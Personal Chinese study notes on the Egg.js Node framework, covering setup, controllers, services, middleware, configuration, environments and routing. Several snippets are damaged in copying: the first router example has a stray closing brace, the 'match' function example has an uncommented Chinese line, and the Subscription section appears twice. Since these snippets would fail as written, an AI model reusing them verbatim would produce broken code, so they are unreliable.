egg 2.x需要node.js 8以上版本
-------------------------------
快速入门
$ npm i egg-init -g
$ egg-init egg-example --type=simple
$ cd egg-example
$ npm i
$ npm run dev
$ open localhost:7001

编写controller
// app/controller/home.js
const Controller = require('egg').Controller;

class HomeController extends Controller {
  async index() {
      this.ctx.body = 'Hello world';
  }
}

module.exports = HomeController;

路由
// app/router.js
 module.exports = app => {
	 const { router, controller  } = app;
		 router.get('/', controller.home.index);
		 };
 }

配置文件
// config/config.default.js
exports.keys = <此处改为你自己的 Cookie 安全字符串>;

静态资源
Egg 内置了 static 插件，线上环境建议部署到 CDN，无需该插件。

static 插件默认映射 /public/* -> app/public/* 目录 //

此处，我们把静态资源都放到 app/public 目录即可：

app/public
├── css
│   └── news.css
└── js
    ├── lib.js
        └── news.js

模板渲染
$ npm i egg-view-nunjucks --save
开启插件：

// config/plugin.js
exports.nunjucks = {
	enable: true,
	package: 'egg-view-nunjucks'
};
// config/config.default.js
exports.keys = <此处改为你自己的 Cookie 安全字符串>;
// 添加 view 配置
exports.view = {
	defaultViewEngine: 'nunjucks',
	mapping: {
		'.tpl': 'nunjucks',
	},
};
注意：是 config 目录，不是 app/config!

	为列表页编写模板文件，一般放置在 app/view 目录下

<!-- app/view/news/list.tpl -->
<html>
<head>
<title>Hacker News</title>
<link rel="stylesheet" href="/public/css/news.css" />
</head>
<body>
<ul class="news-view view">
{% for item in list %}
<li class="item">
<a href="{{ item.url  }}">{{ item.title  }}</a>
</li>
{% endfor %}
</ul>
</body>
</html>
	添加 Controller 和 Router

// app/controller/news.js
const Controller = require('egg').Controller;

class NewsController extends Controller {
	async list() {
		const dataList = {
			list: [
				{ id: 1, title: 'this is news 1', url: '/news/1'  },
				{ id: 2, title: 'this is news 2', url: '/news/2'  }
			]
		};
		await this.ctx.render('news/list.tpl', dataList);
	}
}

module.exports = NewsController;

// app/router.js
module.exports = app => {
	const { router, controller  } = app;
	router.get('/', controller.home.index);
	router.get('/news', controller.news.list);
};
启动浏览器，访问 http://localhost:7001/news 即可看到渲染后的页面。

数据service层
在实际应用中，Controller 一般不会自己产出数据，也不会包含复杂的逻辑，复杂的过程应抽象为业务逻辑层 Service。

我们来添加一个 Service 抓取 Hacker News 的数据 ，如下：
 app/service/news.js
const Service = require('egg').Service;

class NewsService extends Service {
	async list(page = 1) {
		// read config
		const { serverUrl, pageSize  } = this.config.news;

		// use build-in http client to GET hacker-news api
		const { data: idList  } = await this.ctx.curl(`${serverUrl}/topstories.json`, {
			data: {
				orderBy: '"$key"',
				startAt: `"${pageSize * (page - 1)}"`,
				endAt: `"${pageSize * page - 1}"`,
			},
			dataType: 'json',
		});

		// parallel GET detail
		const newsList = await Promise.all(
			Object.keys(idList).map(key => {
				const url = `${serverUrl}/item/${idList[key]}.json`;
				return this.ctx.curl(url, { dataType: 'json'  });
			})
		);
		return newsList.map(res => res.data);
	}
}

module.exports = NewsService;

框架提供了内置的 HttpClient 来方便开发者使用 HTTP 请求。

然后稍微修改下之前的 Controller：
// app/controller/news.js
const Controller = require('egg').Controller;

class NewsController extends Controller {
	async list() {
		const ctx = this.ctx;
		const page = ctx.query.page || 1;
		const newsList = await ctx.service.news.list(page);
		await ctx.render('news/list.tpl', { list: newsList  });
	}
}

module.exports = NewsController;

还需增加 app/service/news.js 中读取到的配置：
// config/config.default.js
// // 添加 news 的配置项
exports.news = {
	pageSize: 5,
	serverUrl: 'https://hacker-news.firebaseio.com/v0',
};

编写扩展
遇到一个小问题，我们的资讯时间的数据是 UnixTime 格式的，我们希望显示为便于阅读的格式。
框架提供了一种快速扩展的方式，只需在 app/extend 目录下提供扩展脚本即可，具体参见扩展。
在这里，我们可以使用 View 插件支持的 Helper 来实现：

$ npm i moment --save
// app/extend/helper.js
const moment = require('moment');
exports.relativeTime = time => moment(new Date(time * 1000)).fromNow();
在模板里面使用：
<!-- app/view/news/list.tpl -->
{{ helper.relativeTime(item.time)  }}

编写 Middleware
假设有个需求：我们的新闻站点，禁止百度爬虫访问。

聪明的同学们一定很快能想到可以通过 Middleware 判断 User-Agent，如下：
// app/middleware/robot.js
// // options === app.config.robot
module.exports = (options, app) => {
	return async function robotMiddleware(ctx, next) {
		const source = ctx.get('user-agent') || '';
		const match = options.ua.some(ua => ua.test(source));
		if (match) {
			ctx.status = 403;
			ctx.message = 'Go away, robot.';
		} else {
			await next();
		}
	}
};

// config/config.default.js
// add middleware robot
exports.middleware = [
	'robot'
];
// robot's configurations
exports.robot = {
	ua: [
		/Baiduspider/i,
	]
};

配置文件初步
写业务的时候，不可避免的需要有配置文件，框架提供了强大的配置合并管理功能：

支持按环境变量加载不同的配置文件，如 config.local.js， config.prod.js 等等。
应用/插件/框架都可以配置自己的配置文件，框架将按顺序合并加载。
具体合并逻辑可参见配置文件。

// config/config.default.js
exports.robot = {
	ua: [
		/curl/i,
		/Baiduspider/i,
	],
};

// config/config.local.js
// only read at development mode, will override default
exports.robot = {
	ua: [
		/Baiduspider/i,
	],
};

// app/service/some.js
const Service = require('egg').Service;

class SomeService extends Service {
	async list() {
		const rule = this.config.robot.ua;
	}
}

module.exports = SomeService;

单元测试初步
单元测试非常重要，框架也提供了 egg-bin 来帮开发者无痛的编写测试。

测试文件应该放在项目根目录下的 test 目录下，并以 test.js 为后缀名，即 {app_root}/test/**/*.test.js。

// test/app/middleware/robot.test.js
const { app, mock, assert  } = require('egg-mock/bootstrap');

describe('test/app/middleware/robot.test.js', () => {
	it('should block robot', () => {
		return app.httpRequest()
			.get('/')
			.set('User-Agent', "Baiduspider")
			.expect(403);
	});
});

//package.json 配置
{
	"scripts": {
		"test": "egg-bin test",
		"cov": "egg-bin cov"
	}
}
$ npm i egg-mock --save-dev
$ npm test

-------------------------------
详情
-------------------------------
目录结构
egg-project
├── package.json
├── app.js (可选)
├── agent.js (可选)
├── app
|   ├── router.js
│   ├── controller
│   |   └── home.js
│   ├── service (可选)
│   |   └── user.js
│   ├── middleware (可选)
│   |   └── response_time.js
│   ├── schedule (可选)
│   |   └── my_task.js
│   ├── public (可选)
│   |   └── reset.css
│   ├── view (可选)
│   |   └── home.tpl
│   └── extend (可选)
│       ├── helper.js (可选)
│       ├── request.js (可选)
│       ├── response.js (可选)
│       ├── context.js (可选)
│       ├── application.js (可选)
│       └── agent.js (可选)
├── config
|   ├── plugin.js
|   ├── config.default.js
│   ├── config.prod.js
|   ├── config.test.js (可选)
|   ├── config.local.js (可选)
|   └── config.unittest.js (可选)
└── test
    ├── middleware
    |   └── response_time.test.js
    └── controller
        └── home.test.js

如上，由框架约定的目录：

app/router.js 用于配置 URL 路由规则，具体参见 Router。
app/controller/** 用于解析用户的输入，处理后返回相应的结果，具体参见 Controller。//
app/service/** 用于编写业务逻辑层，可选，建议使用，具体参见 Service。//
app/middleware/** 用于编写中间件，可选，具体参见 Middleware。//
app/public/** 用于放置静态资源，可选，具体参见内置插件 egg-static。//
app/extend/** 用于框架的扩展，可选，具体参见框架扩展。//
config/config.{env}.js 用于编写配置文件，具体参见配置。//
config/plugin.js 用于配置需要加载的插件，具体参见插件。//
test/** 用于单元测试，具体参见单元测试。 */
app.js 和 agent.js 用于自定义启动时的初始化工作，可选，具体参见启动自定义。关于agent.js的作用参见Agent机制。//

由内置插件约定的目录：//
app/public/** 用于放置静态资源，可选，具体参见内置插件 egg-static。//
app/schedule/** (*/)用于定时任务，可选，具体参见定时任务。

若需自定义自己的目录规范，参见 Loader API

app/view/** 用于放置模板文件，可选，由模板插件约定，具体参见模板渲染。//
app/model/** 用于放置领域模型，可选，由领域类相关插件约定，如 egg-sequelize。//

-------------------------------
内置对象

Application
Application 是全局应用对象，在一个应用中，只会实例化一个，它继承自 Koa.Application，在它上面我们可以挂载一些全局的方法和对象。我们可以轻松的在插件或者应用中扩展 Application 对象。

事件
在框架运行时，会在 Application 实例上触发一些事件，应用开发者或者插件开发者可以监听这些事件做一些操作。作为应用开发者，我们一般会在启动自定义脚本中进行监听。

server: 该事件一个 worker 进程只会触发一次，在 HTTP 服务完成启动后，会将 HTTP server 通过这个事件暴露出来给开发者。
error: 运行时有任何的异常被 onerror 插件捕获后，都会触发 error 事件，将错误对象和关联的上下文（如果有）暴露给开发者，可以进行自定义的日志记录上报等处理。
request 和 response: 应用收到请求和响应请求时，分别会触发 request 和 response 事件，并将当前请求上下文暴露出来，开发者可以监听这两个事件来进行日志记录。
// app.js
//
module.exports = app => {
	app.once('server', server => {
		// websocket
	});
	app.on('error', (err, ctx) => {
		// report error
	});
	app.on('request', ctx => {
		// log receive request
	});
	app.on('response', ctx => {
		// ctx.starttime is set by framework
		const used = Date.now() - ctx.starttime;
		// log total cost
	});
};

Application获取方式
Application 对象几乎可以在编写应用时的任何一个地方获取到，下面介绍几个经常用到的获取方式：

几乎所有被框架 Loader 加载的文件（Controller，Service，Schedule 等），都可以 export 一个函数，这个函数会被 Loader 调用，并使用 app 作为参数：

启动自定义脚本

// app.js
module.exports = app => {
	app.cache = new Cache();
};
Controller 文件

// app/controller/user.js
class UserController extends Controller {
	async fetch() {
		this.ctx.body = app.cache.get(this.ctx.query.id);
	}
}
和 Koa 一样，在 Context 对象上，可以通过 ctx.app 访问到 Application 对象。以上面的 Controller 文件举例：

// app/controller/user.js
class UserController extends Controller {
	async fetch() {
		this.ctx.body = this.ctx.app.cache.get(this.ctx.query.id);
	}
}
在继承于 Controller, Service 基类的实例中，可以通过 this.app 访问到 Application 对象。

// app/controller/user.js
class UserController extends Controller {
	async fetch() {
		this.ctx.body = this.app.cache.get(this.ctx.query.id);
	}
};


## Context
Context 是一个请求级别的对象，继承自 Koa.Context。在每一次收到用户请求时，框架会实例化一个 Context 对象，这个对象封装了这次用户请求的信息，并提供了许多便捷的方法来获取请求参数或者设置响应信息。框架会将所有的 Service 挂载到 Context 实例上，一些插件也会将一些其他的方法和对象挂载到它上面（egg-sequelize 会将所有的 model 挂载在 Context 上）。

获取方式
最常见的 Context 实例获取方式是在 Middleware, Controller 以及 Service 中。Controller 中的获取方式在上面的例子中已经展示过了，在 Service 中获取和 Controller 中获取的方式一样，在 Middleware 中获取 Context 实例则和 Koa 框架在中间件中获取 Context 对象的方式一致。

框架的 Middleware 同时支持 Koa v1 和 Koa v2 两种不同的中间件写法，根据不同的写法，获取 Context 实例的方式也稍有不同：

// Koa v2
async function middleware(ctx, next) {
	// ctx is instance of Context
	console.log(ctx.query);
}
除了在请求时可以获取 Context 实例之外， 在有些非用户请求的场景下我们需要访问 service / model 等 Context 实例上的对象，我们可以通过 Application.createAnonymousContext() 方法创建一个匿名 Context 实例：

// app.js
module.exports = app => {
	app.beforeStart(async () => {
		const ctx = app.createAnonymousContext();
		// preload before app start
		await ctx.service.posts.load();
	});
}
在定时任务中的每一个 task 都接受一个 Context 实例作为参数，以便我们更方便的执行一些定时的业务逻辑：

// app/schedule/refresh.js
exports.task = async ctx => {
	await ctx.service.posts.refresh();
};

## Request 和 Response
Request 是一个请求级别的对象，继承自 Koa.Request。封装了 Node.js 原生的 HTTP Request 对象，提供了一系列辅助方法获取 HTTP 请求常用参数。

Response 是一个请求级别的对象，继承自 Koa.Response。封装了 Node.js 原生的 HTTP Response 对象，提供了一系列辅助方法设置 HTTP 响应。

Request和Response获取方式
获取方式
可以在 Context 的实例上获取到当前请求的 Request(ctx.request) 和 Response(ctx.response) 实例。

// app/controller/user.js
class UserController extends Controller {
	async fetch() {
		const { app, ctx  } = this;
		const id = ctx.request.query.id;
		ctx.response.body = app.cache.get(id);
	}
}
Koa 会在 Context 上代理一部分 Request 和 Response 上的方法和属性，参见 Koa.Context。
如上面例子中的 ctx.request.query.id 和 ctx.query.id 是等价的，ctx.response.body= 和 ctx.body= 是等价的。
需要注意的是，获取 POST 的 body 应该使用 ctx.request.body，而不是 ctx.body。

## Controller
框架提供了一个 Controller 基类，并推荐所有的 Controller 都继承于该基类实现。这个 Controller 基类有下列属性：

ctx - 当前请求的 Context 实例。
app - 应用的 Application 实例。
config - 应用的配置。
service - 应用所有的 service。
logger - 为当前 controller 封装的 logger 对象。
在 Controller 文件中，可以通过两种方式来引用 Controller 基类：
// app/controller/user.js
//
// 从 egg 上获取（推荐）
const Controller = require('egg').Controller;
class UserController extends Controller {
	// implement
}
module.exports = UserController;

// 从 app 实例上获取
module.exports = app => {
	return class UserController extends app.Controller {
		// implement
	};
};

## Service
框架提供了一个 Service 基类，并推荐所有的 Service 都继承于该基类实现。

Service 基类的属性和 Controller 基类属性一致，访问方式也类似：

// app/service/user.js
//
// // 从 egg 上获取（推荐）
const Service = require('egg').Service;
class UserService extends Service {
	// implement
}
module.exports = UserService;

// 从 app 实例上获取
module.exports = app => {
	return class UserService extends app.Service {
		// implement
	};
};

## Helper
Helper 用来提供一些实用的 utility 函数。它的作用在于我们可以将一些常用的动作抽离在 helper.js 里面成为一个独立的函数，这样可以用 JavaScript 来写复杂的逻辑，避免逻辑分散各处，同时可以更好的编写测试用例。

Helper 自身是一个类，有和 Controller 基类一样的属性，它也会在每次请求时进行实例化，因此 Helper 上的所有函数也能获取到当前请求相关的上下文信息。

获取方式
可以在 Context 的实例上获取到当前请求的 Helper(ctx.helper) 实例。

// app/controller/user.js
class UserController extends Controller {
	async fetch() {
		const { app, ctx  } = this;
		const id = ctx.query.id;
		const user = app.cache.get(id);
		ctx.body = ctx.helper.formatUser(user);
	}
}
除此之外，Helper 的实例还可以在模板中获取到，例如可以在模板中获取到 security 插件提供的 shtml 方法。

// app/view/home.nj
{{ helper.shtml(value)  }}

自定义 helper 方法
应用开发中，我们可能经常要自定义一些 helper 方法，例如上面例子中的 formatUser，我们可以通过框架扩展的形式来自定义 helper 方法。

// app/extend/helper.js
module.exports = {
	formatUser(user) {
		return only(user, [ 'name', 'phone'  ]);
	}
};

## Config
我们推荐应用开发遵循配置和代码分离的原则，将一些需要硬编码的业务配置都放到配置文件中，同时配置文件支持各个不同的运行环境使用不同的配置，使用起来也非常方便，所有框架、插件和应用级别的配置都可以通过 Config 对象获取到，关于框架的配置，可以详细阅读 Config 配置章节。

 获取方式
我们可以通过 app.config 从 Application 实例上获取到 config 对象，也可以在 Controller, Service, Helper 的实例上通过 this.config 获取到 config 对象。

## Logger
框架内置了功能强大的日志功能，可以非常方便的打印各种级别的日志到对应的日志文件中，每一个 logger 对象都提供了 5 个级别的方法：

logger.debug()
logger.info()
logger.warn()
logger.error()
在框架中提供了多个 Logger 对象，下面我们简单的介绍一下各个 Logger 对象的获取方式和使用场景。

 App Logger
我们可以通过 app.logger 来获取到它，如果我们想做一些应用级别的日志记录，如记录启动阶段的一些数据信息，记录一些业务上与请求无关的信息，都可以通过 App Logger 来完成。

 App CoreLogger
我们可以通过 app.coreLogger 来获取到它，一般我们在开发应用时都不应该通过 CoreLogger 打印日志，而框架和插件则需要通过它来打印应用级别的日志，这样可以更清晰的区分应用和框架打印的日志，通过 CoreLogger 打印的日志会放到和 Logger 不同的文件中。

 Context Logger
我们可以通过 ctx.logger 从 Context 实例上获取到它，从访问方式上我们可以看出来，Context Logger 一定是与请求相关的，它打印的日志都会在前面带上一些当前请求相关的信息（如 [$userId/$ip/$traceId/${cost}ms $method $url]），通过这些信息，我们可以从日志快速定位请求，并串联一次请求中的所有的日志。

 Context CoreLogger
我们可以通过 ctx.coreLogger 获取到它，和 Context Logger 的区别是一般只有插件和框架会通过它来记录日志。

 Controller Logger & Service Logger
我们可以在 Controller 和 Service 实例上通过 this.logger 获取到它们，它们本质上就是一个 Context Logger，不过在打印日志的时候还会额外的加上文件路径，方便定位日志的打印位置。

 Subscription
订阅模型是一种比较常见的开发模式，譬如消息中间件的消费者或调度任务。因此我们提供了 Subscription 基类来规范化这个模式。

可以通过以下方式来引用 Subscription 基类：

const Subscription = require('egg').Subscription;

class Schedule extends Subscription {
    // 需要实现此方法
  //   // subscribe 可以为 async function 或 generator function
	async subscribe() {}
  //
}
插件开发者可以根据自己的需求基于它定制订阅规范，如定时任务就是使用这种规范实现的。


##  Subscription
订阅模型是一种比较常见的开发模式，譬如消息中间件的消费者或调度任务。因此我们提供了 Subscription 基类来规范化这个模式。

可以通过以下方式来引用 Subscription 基类：

const Subscription = require('egg').Subscription;

class Schedule extends Subscription {
	//需要实现此方法
	// subscribe 可以为 async function 或 generator function
	async subscribe() {}
}
插件开发者可以根据自己的需求基于它定制订阅规范，如定时任务就是使用这种规范实现的。


-------------------------------
运行与开发环境

## 指定运行环境
框架有两种方式指定运行环境：

通过 config/env 文件指定，该文件的内容就是运行环境，如 prod。一般通过构建工具来生成这个文件。
通过 EGG_SERVER_ENV 环境变量指定。
其中，方式 2 比较常用，因为通过 EGG_SERVER_ENV 环境变量指定运行环境更加方便，比如在生产环境启动应用：

EGG_SERVER_ENV=prod npm start

应用内获取运行环境
框架提供了变量 app.config.env 来表示应用当前的运行环境。

与 NODE_ENV 的区别
很多 Node.js 应用会使用 NODE_ENV 来区分运行环境，但 EGG_SERVER_ENV 区分得更加精细。一般的项目开发流程包括本地开发环境、测试环境、生产环境等，除了本地开发环境和测试环境外，其他环境可统称为服务器环境，服务器环境的 NODE_ENV 应该为 production。而且 npm 也会使用这个变量，在应用部署的时候一般不会安装 devDependencies，所以这个值也应该为 production。

框架默认支持的运行环境及映射关系（如果未指定 EGG_SERVER_ENV 会根据 NODE_ENV 来匹配）

NODE_ENV  EGG_SERVER_ENV  说明
					local           本地开发环境
test      unittest        单元测试
production  prod          生产环境

例如，当 NODE_ENV 为 production 而 EGG_SERVER_ENV 未指定时，框架会将 EGG_SERVER_ENV 设置成 prod。

自定义环境
常规开发流程可能不仅仅只有以上几种环境，Egg 支持自定义环境来适应自己的开发流程。

比如，要为开发流程增加集成测试环境 SIT。将 EGG_SERVER_ENV 设置成 sit（并建议设置 NODE_ENV = production），启动时会加载 config/config.sit.js，运行环境变量 app.config.env 会被设置成 sit。


-------------------------------
## 配置
多环境配置
框架支持根据环境来加载配置，定义多个环境的配置文件，具体环境请查看运行环境配置

config
|- config.default.js
|- config.test.js
|- config.prod.js
|- config.unittest.js
`- config.local.js

config.default.js 为默认的配置文件，所有环境都会加载这个配置文件，一般也会作为开发环境的默认配置文件。

当指定 env 时会同时加载对应的配置文件，并覆盖默认配置文件的同名配置。如 prod 环境会加载 config.prod.js 和 config.default.js 文件，config.prod.js 会覆盖 config.default.js 的同名配置。

置写法
配置文件返回的是一个 object 对象，可以覆盖框架的一些配置，应用也可以将自己业务的配置放到这里方便管理。

// 配置 logger 文件的目录，logger 默认配置由框架提供
module.exports = {
	logger: {
		dir: '/home/admin/logs/demoapp',
	},
};

配置文件也可以简化的写成 exports.key = value 形式

exports.keys = 'my-cookie-secret-key';
exports.logger = {
	level: 'DEBUG',
};

配置文件也可以返回一个 function，可以接受 appInfo 参数

// 将 logger 目录放到代码目录下
const path = require('path');
module.exports = appInfo => {
	return {
		logger: {
			dir: path.join(appInfo.baseDir, 'logs'),
		},
	};
};

内置的 appInfo 有

appInfo  说明
pkg  package.json
name 应用名，同 pkg.name
baseDir  应用代码的目录
HOME 用户目录，如 admin 账户为 /home/admin
root 应用根目录，只有在 local 和 unittest 环境下为 baseDir，其他都为 HOME。

appInfo.root 是一个优雅的适配，比如在服务器环境我们会使用 /home/admin/logs 作为日志目录，而本地开发时又不想污染用户目录，这样的适配就很好解决这个问题。

请根据具体场合选择合适的写法，但请确保没有写出以下代码：
// config/config.default.js
exports.someKeys = 'abc';
module.exports = appInfo => {
	const config = {};
	config.keys = '123456';
	return config;
};

## 配置加载顺序
应用、插件、框架都可以定义这些配置，而且目录结构都是一致的，但存在优先级（应用 > 框架 > 插件），相对于此运行环境的优先级会更高。

比如在 prod 环境加载一个配置的加载顺序如下，后加载的会覆盖前面的同名配置。

-> 插件 config.default.js
-> 框架 config.default.js
-> 应用 config.default.js
-> 插件 config.prod.js
-> 框架 config.prod.js
-> 应用 config.prod.js

注意：插件之间也会有加载顺序，但大致顺序类似，具体逻辑可查看加载器。

 配置结果
框架在启动时会把合并后的最终配置 dump 到 run/application_config.json（worker 进程）和 run/agent_config.json（agent 进程）中，可以用来分析问题。

配置文件中会隐藏一些字段，主要包括两类:

如密码、密钥等安全字段，这里可以通过 config.dump.ignore 配置，必须是 Set 类型，查看默认配置。
如函数、Buffer 等类型，JSON.stringify 后的内容特别大
还会生成 run/application_config_meta.json（worker 进程）和 run/agent_config_meta.json（agent 进程）文件，用来排查属性的来源，如

{
	"logger": {
		"dir": "/path/to/config/config.default.js"
	}
}

-------------------------------
## 中间件

写法
我们先来通过编写一个简单的 gzip 中间件，来看看中间件的写法。

// app/middleware/gzip.js
const isJSON = require('koa-is-json');
const zlib = require('zlib');

async function gzip(ctx, next) {
	await next();

	// 后续中间件执行完成后将响应体转换成 gzip
	let body = ctx.body;
	if (!body) return;
	if (isJSON(body)) body = JSON.stringify(body);

	// 设置 gzip body，修正响应头
	const stream = zlib.createGzip();
	stream.end(body);
	ctx.body = stream;
	ctx.set('Content-Encoding', 'gzip');
}
可以看到，框架的中间件和 Koa 的中间件写法是一模一样的，所以任何 Koa 的中间件都可以直接被框架使用。


一般来说中间件也会有自己的配置。在框架中，一个完整的中间件是包含了配置处理的。我们约定一个中间件是一个放置在 app/middleware 目录下的单独文件，它需要 exports 一个普通的 function，接受两个参数：

options: 中间件的配置项，框架会将 app.config[${middlewareName}] 传递进来。
app: 当前应用 Application 的实例。
我们将上面的 gzip 中间件做一个简单的优化，让它支持指定只有当 body 大于配置的 threshold 时才进行 gzip 压缩，我们要在 app/middleware 目录下新建一个文件 gzip.js

// app/middleware/gzip.js
const isJSON = require('koa-is-json');
const zlib = require('zlib');

module.exports = options => {
	return async function gzip(ctx, next) {
		await next();

		// 后续中间件执行完成后将响应体转换成 gzip
		let body = ctx.body;
		if (!body) return;

		// 支持 options.threshold
		if (options.threshold && ctx.length < options.threshold) return;

		if (isJSON(body)) body = JSON.stringify(body);

		// 设置 gzip body，修正响应头
		const stream = zlib.createGzip();
		stream.end(body);
		ctx.body = stream;
		ctx.set('Content-Encoding', 'gzip');
	};
};

使用中间件
中间件编写完成后，我们还需要手动挂载，支持以下方式：

 在应用中使用中间件
在应用中，我们可以完全通过配置来加载自定义的中间件，并决定它们的顺序。

如果我们需要加载上面的 gzip 中间件，在 config.default.js 中加入下面的配置就完成了中间件的开启和配置：

module.exports = {
    // 配置需要的中间件，数组顺序即为中间件的加载顺序
	middleware: [ 'gzip'  ],

	// 配置 gzip 中间件的配置
	gzip: {
		threshold: 1024, // 小于 1k 的响应体不压缩
	},
};
该配置最终将在启动时合并到 app.config.appMiddleware。


 在框架和插件中使用中间件
框架和插件不支持在 config.default.js 中匹配 middleware，需要通过以下方式：

// app.js
module.exports = app => {
	// 在中间件最前面统计请求时间
	app.config.coreMiddleware.unshift('report');
};

// app/middleware/report.js
module.exports = () => {
	return async function (ctx, next) {
		const startTime = Date.now();
		await next();
		// 上报请求时间
		reportTime(Date.now() - startTime);
	}
};
应用层定义的中间件（app.config.appMiddleware）和框架默认中间件（app.config.coreMiddleware）都会被加载器加载，并挂载到 app.middleware 上。

router 中使用中间件
以上两种方式配置的中间件是全局的，会处理每一次请求。 如果你只想针对单个路由生效，可以直接在 app/router.js 中实例化和挂载，如下：

module.exports = app => {
	const gzip = app.middleware.gzip({ threshold: 1024  });
	app.router.get('/needgzip', gzip, app.controller.handler);
};

框架中默认中间件
除了应用层加载中间件之外，框架自身和其他的插件也会加载许多中间件。所有的这些自带中间件的配置项都通过在配置中修改中间件同名配置项进行修改，例如框架自带的中间件中有一个 bodyParser 中间件（框架的加载器会将文件名中的各种分隔符都修改成驼峰形式的变量名），我们想要修改 bodyParser 的配置，只需要在 config/config.default.js 中编写

module.exports = {
	bodyParser: {
		jsonLimit: '10mb',
	},
};
注意：框架和插件加载的中间件会在应用层配置的中间件之前，框架默认中间件不能被应用层中间件覆盖，如果应用层有自定义同名中间件，在启动时会报错。

## 使用 Koa 的中间件
在框架里面可以非常容易的引入 Koa 中间件生态。

以 koa-compress 为例，在 Koa 中使用时：

const koa = require('koa');
const compress = require('koa-compress');
const app = koa();
const options = { threshold: 2048  };
app.use(compress(options));

我们按照框架的规范来在应用中加载这个 Koa 的中间件：

// app/middleware/compress.js
// koa-compress 暴露的接口(`(options) => middleware`)和框架对中间件要求一致
module.exports = require('koa-compress');
// config/config.default.js
module.exports = {
	middleware: [ 'compress'  ],
	compress: {
		threshold: 2048,
	},
};
如果使用到的 Koa 中间件不符合入参规范，则可以自行处理下：

// config/config.default.js
module.exports = {
	webpack: {
		compiler: {},
		others: {},
	},
};

// app/middleware/webpack.js
const webpackMiddleware = require('some-koa-middleware');

module.exports = (options, app) => {
	return webpackMiddleware(options.compiler, options.others);
}

通用配置
无论是应用层加载的中间件还是框架自带中间件，都支持几个通用的配置项：

enable：控制中间件是否开启。
match：设置只有符合某些规则的请求才会经过这个中间件。
ignore：设置符合某些规则的请求不经过这个中间件。
 enable
如果我们的应用并不需要默认的 bodyParser 中间件来进行请求体的解析，此时我们可以通过配置 enable 为 false 来关闭它

module.exports = {
	bodyParser: {
		enable: false,
	},
};
 match 和 ignore
match 和 ignore 支持的参数都一样，只是作用完全相反，match 和 ignore 不允许同时配置。

如果我们想让 gzip 只针对 /static 前缀开头的 url 请求开启，我们可以配置 match 选项

module.exports = {
	gzip: {
		match: '/static',
	},
};
match 和 ignore 支持多种类型的配置方式

字符串：当参数为字符串类型时，配置的是一个 url 的路径前缀，所有以配置的字符串作为前缀的 url 都会匹配上。
正则：当参数为正则时，直接匹配满足正则验证的 url 的路径。
函数：当参数为一个函数时，会将请求上下文传递给这个函数，最终取函数返回的结果（ture/false）来判断是否匹配。
module.exports = {
  gzip: {
    match(ctx) {
			只有 ios 设备才开启
			const reg = /iphone|ipad|ipod/i;
			return reg.test(ctx.get('user-agent'));
		},
	},
};

-------------------------------
Router 路由
框架约定了 app/router.js 文件用于统一所有路由规则。

如何定义 Router
app/router.js 里面定义 URL 路由规则
// app/router.js
module.exports = app => {
	const { router, controller  } = app;
	router.get('/user/:id', controller.user.info);
};
app/controller 目录下面实现 Controller
// app/controller/user.js
class UserController extends Controller {
	async info() {
		const { ctx  } = this;
		ctx.body = {
			name: `hello ${ctx.params.id}`,
		};
	}
}
这样就完成了一个最简单的 Router 定义，当用户执行 GET /user/123，user.js 这个里面的 info 方法就会执行。

##  Router 详细定义说明
下面是路由的完整定义，参数可以根据场景的不同，自由选择：

router.verb('path-match', app.controller.action);
router.verb('router-name', 'path-match', app.controller.action);
router.verb('path-match', middleware1, ..., middlewareN, app.controller.action);
router.verb('router-name', 'path-match', middleware1, ..., middlewareN, app.controller.action);
路由完整定义主要包括5个主要部分:

verb - 用户触发动作，支持 get，post 等所有 HTTP 方法，后面会通过示例详细说明。
router.head - HEAD
router.options - OPTIONS
router.get - GET
router.put - PUT
router.post - POST
router.patch - PATCH
router.delete - DELETE
router.del - 由于 delete 是一个保留字，所以提供了一个 delete 方法的别名。
router.redirect - 可以对 URL 进行重定向处理，比如我们最经常使用的可以把用户访问的根目录路由到某个主页。
router-name 给路由设定一个别名，可以通过 Helper 提供的辅助函数 pathFor 和 urlFor 来生成 URL。(可选)
path-match - 路由 URL 路径。
middleware1 - 在 Router 里面可以配置多个 Middleware。(可选)
controller - 指定路由映射到的具体的 controller 上，controller 可以有两种写法：
app.controller.user.fetch - 直接指定一个具体的 controller
'user.fetch' - 可以简写为字符串形式


 注意事项
* 在 Router 定义中， 可以支持多个 Middleware 串联执行
* Controller 必须定义在 app/controller 目录中。
* 一个文件里面也可以包含多个 Controller 定义，在定义路由的时候，可以通过 ${fileName}.${functionName} 的方式指定对应的 Controller。
* Controller 支持子目录，在定义路由的时候，可以通过 ${directoryName}.${fileName}.${functionName} 的方式制定对应的 Controller。
下面是一些路由定义的方式：

// app/router.js
module.exports = app => {
	const { router, controller  } = app;
	router.get('/home', controller.home);
	router.get('/user/:id', controller.user.page);
	router.post('/admin', isAdmin, controller.admin);
	router.post('/user', isLoginUser, hasAdminPermission, controller.user.create);
	router.post('/api/v1/comments', controller.v1.comments.create); // app/controller/v1/comments.js
};

RESTful 风格的 URL 定义
如果想通过 RESTful 的方式来定义路由， 我们提供了 app.resources('routerName', 'pathMatch', controller) 快速在一个路径上生成 CRUD 路由结构。

// app/router.js
module.exports = app => {
	const { router, controller  } = app;
	router.resources('posts', '/api/posts', controller.posts);
	router.resources('users', '/api/v1/users', controller.v1.users); // app/controller/v1/users.js
};
上面代码就在 /posts 路径上部署了一组 CRUD 路径结构，对应的 Controller 为 app/controller/posts.js 接下来， 你只需要在 posts.js 里面实现对应的函数就可以了。

Method Path  Route Name  Controller.Action
GET  /posts  posts app.controllers.posts.index
GET  /posts/new  new_post  app.controllers.posts.new
GET  /posts/:id  post  app.controllers.posts.show
GET  /posts/:id/edit edit_post app.controllers.posts.edit
POST /posts  posts app.controllers.posts.create
PUT  /posts/:id  post  app.controllers.posts.update
DELETE /posts/:id  post  app.controllers.posts.destroy

// app/controller/posts.js
exports.index = async () => {};

exports.new = async () => {};

exports.create = async () => {};

exports.show = async () => {};

exports.edit = async () => {};

exports.update = async () => {};

exports.destroy = async () => {};
如果我们不需要其中的某几个方法，可以不用在 posts.js 里面实现，这样对应 URL 路径也不会注册到 Router。


}

## Router实战
下面通过更多实际的例子，来说明 router 的用法。

 参数获取
 Query String 方式
// app/router.js
module.exports = app => {
	app.router.get('/search', app.controller.search.index);
};

// app/controller/search.js
exports.index = async ctx => {
	ctx.body = `search: ${ctx.query.name}`;
};

// curl http://127.0.0.1:7001/search?name=egg
参数命名方式
// app/router.js
module.exports = app => {
	app.router.get('/user/:id/:name', app.controller.user.info);
};

// app/controller/user.js
exports.info = async ctx => {
	ctx.body = `user: ${ctx.params.id}, ${ctx.params.name}`;
};

